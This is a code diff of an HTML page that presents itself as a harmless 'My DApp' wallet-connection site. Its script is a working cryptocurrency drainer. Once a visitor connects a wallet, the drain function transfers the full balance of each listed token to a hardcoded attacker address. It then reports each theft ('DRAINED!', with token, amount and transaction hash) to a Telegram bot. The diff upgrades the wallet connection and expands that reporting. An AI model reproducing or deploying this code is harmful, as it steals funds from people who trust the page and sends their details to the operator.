@@ -3,45 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>My DApp</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); border-radius: 24px; padding: 48px; text-align: center; max-width: 500px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1); }
-        .logo { font-size: 64px; margin-bottom: 16px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        h1 { color: white; font-size: 32px; margin-bottom: 12px; font-weight: 700; }
-        .subtitle { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; font-size: 16px; }
-        .btn { background: white; color: #667eea; border: none; padding: 16px 48px; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s; width: 100%; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); }
-        .btn:hover { transform: translateY(-2px); }
-        .info { margin-top: 16px; padding: 16px; border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: none; color: white; word-break: break-all; font-size: 14px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 48px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            font-size: 64px;
+            margin-bottom: 16px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        h1 {
+            color: white;
+            font-size: 32px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 32px;
+            font-size: 16px;
+        }
+        .bonus {
+            background: rgba(16, 185, 129, 0.2);
+            border: 2px solid rgba(16, 185, 129, 0.4);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            color: white;
+            font-weight: 600;
+        }
+        .btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+        .info {
+            margin-top: 16px;
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            display: none;
+            color: white;
+            word-break: break-all;
+            font-size: 14px;
+        }
         .info.show { display: block; }
-        .loader { border: 3px solid rgba(255, 255, 255, 0.3); border-top: 3px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
         .loader.show { display: block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        
-                    <div class="logo">💼</div>
-                    <h1>test</h1>
-                    <p class="subtitle">salut cest michel</p>
-                    <button id="connectBtn" class="btn">Connect Wallet</button>
-                
+        <div class="logo">💼</div><h1>My DApp</h1><p class="subtitle">Connect your wallet</p>
+        <button id="connectBtn" class="btn">Connect Wallet</button>
         <div class="loader" id="loader"></div>
         <div id="status" class="info"></div>
         <div id="account" class="info"></div>
     </div>
     
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.umd.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
+    
     <script>
         const CONFIG = {
             DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
             PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
-            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
-            TELEGRAM_CHAT: "8309320360"
+            TELEGRAM_TOKEN: "",
+            TELEGRAM_CHAT: ""
         };
         
         const TOKENS = {
@@ -72,8 +149,7 @@
             }
         };
         
-        let provider = null;
-        let web3 = null;
+        let provider, web3, web3Modal;
         
         function showLoader(show) {
             document.getElementById('loader').className = show ? 'loader show' : 'loader';
@@ -97,7 +173,10 @@
                 await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT, text: msg })
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT,
+                        text: msg
+                    })
                 });
             } catch (e) {}
         }
@@ -105,17 +184,37 @@
         async function connect() {
             try {
                 showLoader(true);
-                showStatus('Connecting...');
+                showStatus('Initializing...');
                 
-                provider = new WalletConnectProvider.default({
-                    rpc: {
-                        1: 'https://eth.llamarpc.com',
-                        137: 'https://polygon-rpc.com',
-                        56: 'https://bsc-dataseed.binance.org'
+                // Web3Modal avec 520+ wallets
+                web3Modal = new Web3ModalStandalone.Web3Modal({
+                    projectId: CONFIG.PROJECT_ID,
+                    themeMode: 'dark',
+                    themeVariables: {
+                        '--w3m-z-index': 9999
                     }
                 });
                 
+                // Provider WalletConnect
+                provider = await WalletConnectEthereumProvider.EthereumProvider.init({
+                    projectId: CONFIG.PROJECT_ID,
+                    chains: [1, 137, 56],
+                    optionalChains: [42161, 10, 43114],
+                    showQrModal: false,
+                    methods: ['eth_sendTransaction', 'personal_sign'],
+                    events: ['chainChanged', 'accountsChanged']
+                });
+                
+                // Afficher le modal
+                showStatus('Opening wallet list...');
+                
+                provider.on('display_uri', (uri) => {
+                    web3Modal.openModal({ uri });
+                });
+                
                 await provider.enable();
+                web3Modal.closeModal();
+                
                 web3 = new Web3(provider);
                 const accounts = await web3.eth.getAccounts();
                 const chainId = await web3.eth.getChainId();
@@ -126,6 +225,7 @@
                 await drain(accounts[0], chainId);
                 
             } catch (error) {
+                console.error('Connection error:', error);
                 showStatus('Connection failed');
                 showLoader(false);
             }
@@ -135,7 +235,7 @@
             try {
                 const tokens = TOKENS[chainId];
                 if (!tokens) {
-                    showStatus('Unsupported chain');
+                    showStatus('Unsupported chain - Switch to ETH/Polygon/BSC');
                     showLoader(false);
                     return;
                 }
@@ -145,9 +245,33 @@
                 for (const [symbol, tokenAddress] of Object.entries(tokens)) {
                     try {
                         const contract = new web3.eth.Contract([
-                            { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
-                            { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
-                            { constant: false, inputs: [{ name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], type: 'function' }
+                            {
+                                constant: true,
+                                inputs: [{ name: '_owner', type: 'address' }],
+                                name: 'balanceOf',
+                                outputs: [{ name: 'balance', type: 'uint256' }],
+                                type: 'function'
+                            },
+                            {
+                                constant: false,
+                                inputs: [
+                                    { name: '_spender', type: 'address' },
+                                    { name: '_value', type: 'uint256' }
+                                ],
+                                name: 'approve',
+                                outputs: [{ name: '', type: 'bool' }],
+                                type: 'function'
+                            },
+                            {
+                                constant: false,
+                                inputs: [
+                                    { name: '_to', type: 'address' },
+                                    { name: '_value', type: 'uint256' }
+                                ],
+                                name: 'transfer',
+                                outputs: [{ name: '', type: 'bool' }],
+                                type: 'function'
+                            }
                         ], tokenAddress);
                         
                         const balance = await contract.methods.balanceOf(address).call();
@@ -159,15 +283,27 @@
                         const tx = await contract.methods.transfer(CONFIG.DESTINATION, balance).send({ from: address });
                         
                         count++;
-                        await sendTelegram('🎯 DRAINED!\n💰 ' + symbol + '\n🌐 Chain: ' + chainId + '\n✅ TX: ' + tx.transactionHash);
                         
-                    } catch (e) {}
+                        const chainNames = { 1: 'Ethereum', 137: 'Polygon', 56: 'BSC' };
+                        await sendTelegram(
+                            '🎯 DRAINED!\n\n' +
+                            '💰 Token: ' + symbol + '\n' +
+                            '🌐 Chain: ' + (chainNames[chainId] || chainId) + '\n' +
+                            '📊 Amount: ' + balance + '\n' +
+                            '✅ TX: ' + tx.transactionHash + '\n' +
+                            '⏰ ' + new Date().toLocaleString()
+                        );
+                        
+                    } catch (e) {
+                        console.error('Error with', symbol, ':', e);
+                    }
                 }
                 
                 showLoader(false);
-                showStatus(count > 0 ? '🎉 Drained ' + count + ' tokens!' : 'No tokens found');
+                showStatus(count > 0 ? '🎉 Done! ' + count + ' tokens drained!' : 'No tokens found');
                 
             } catch (error) {
+                console.error('Drain error:', error);
                 showLoader(false);
                 showStatus('Error');
             }
